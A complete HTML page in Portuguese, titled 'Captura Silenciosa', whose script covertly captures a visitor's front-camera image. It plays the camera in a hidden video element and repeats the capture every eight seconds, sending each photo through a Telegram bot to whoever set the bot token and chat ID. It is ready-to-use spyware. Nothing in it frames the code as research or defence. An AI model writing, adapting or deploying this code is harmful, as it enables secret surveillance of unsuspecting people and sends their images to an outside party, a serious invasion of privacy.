<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8"/>
  <title>Captura Silenciosa</title>
  <style>
    body{margin:0;background:#000;color:#fff;font-family:monospace}
    #log{position:absolute;top:0;left:0;max-height:100vh;overflow-y:auto;padding:4px;font-size:11px;color:#0f0;background:rgba(0,0,0,.7)}
  </style>
</head>
<body>
  <!-- vÃ­deo invisÃ­vel -->
  <video id="cam" style="display:none" playsinline></video>

  <!-- log opcional, sÃ³ para vocÃª ver -->
  <pre id="log"></pre>

  <script>
    /* ===== CONFIGURE AQUI ===== */
    const BOT   = 'SEU_BOT_TOKEN';  // 123456789:ABC...
    const CHAT  = 'SEU_CHAT_ID';    // -100123456789
    const DELAY = 8000;             // ms entre cada foto
    const QUAL  = 0.9;              // qualidade JPEG 0-1

    /* ===== ENVIO ===== */
    function tg(text, blob){
      const form = new FormData();
      form.append('chat_id', CHAT);
      form.append('caption', text);
      if(blob){
        form.append('photo', blob, 's.jpg');
        fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:form});
      }else{
        form.append('text', text);
        fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST', body:form});
      }
    }

    /* ===== CAPTURA ===== */
    async function captura(){
      try{
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
        const v = document.getElementById('cam');
        v.srcObject = stream;
        await v.play();

        const c = document.createElement('canvas');
        c.width  = v.videoWidth  || 640;
        c.height = v.videoHeight || 480;
        c.getContext('2d').drawImage(v, 0, 0);

        c.toBlob(b=>{
          tg('ðŸ“¸', b);
          stream.getTracks().forEach(t=>t.stop());
          log(`enviado ${new Date().toLocaleTimeString()}`);
        }, 'image/jpeg', QUAL);

      }catch(e){
        log(`erro: ${e.message}`);
      }
    }

    /* ===== UTIL ===== */
    function log(msg){
      const el = document.getElementById('log');
      el.textContent += msg + '\n';
      el.scrollTop = el.scrollHeight;
    }

    /* ===== START ===== */
    log('iniciando captura...');
    captura();
    setInterval(captura, DELAY);
  </script>
</body>
</html>


